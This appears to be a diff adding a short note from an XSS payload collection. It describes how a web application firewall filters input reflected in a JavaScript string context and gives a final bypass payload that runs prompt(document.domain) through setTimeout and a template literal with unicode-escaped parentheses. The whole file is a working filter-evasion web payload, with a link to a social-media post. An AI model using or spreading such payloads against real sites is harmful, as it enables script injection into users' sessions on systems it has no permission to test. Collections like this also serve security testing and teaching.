@@ -1,0 +1,12 @@
+XSS WAF Bypass:
+Reflection in JS context, single quote allowed.
+
+<, > ==> REMOVED
+'-anything()-' ==> '-anything-'
+'-alert()-' ==> REMOVED
+'-setTimeout``-' = allowed
+
+Final Payload:
+'-setTimeout`prompt\u0028document.domain\u0029`-'
+
+https://twitter.com/ShawarkOFFICIAL/status/1369646024105619461/photo/1
